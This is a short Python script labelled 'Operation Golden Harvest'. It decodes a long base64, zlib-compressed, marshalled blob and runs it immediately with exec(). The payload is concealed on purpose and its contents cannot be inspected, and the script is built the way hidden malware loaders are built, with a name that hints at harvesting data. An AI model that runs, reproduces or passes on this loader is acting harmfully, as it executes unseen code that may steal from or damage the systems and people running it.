#!/usr/bin/env python3
# Obfuscated Python Code - Operation Golden Harvest
import base64, zlib, marshal
AEBtMBit = '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'
oZoYobYE = lambda x: marshal.loads(zlib.decompress(base64.b64decode(x)))
dYXKyPGR = lambda: exec(oZoYobYE(AEBtMBit))
dYXKyPGR()
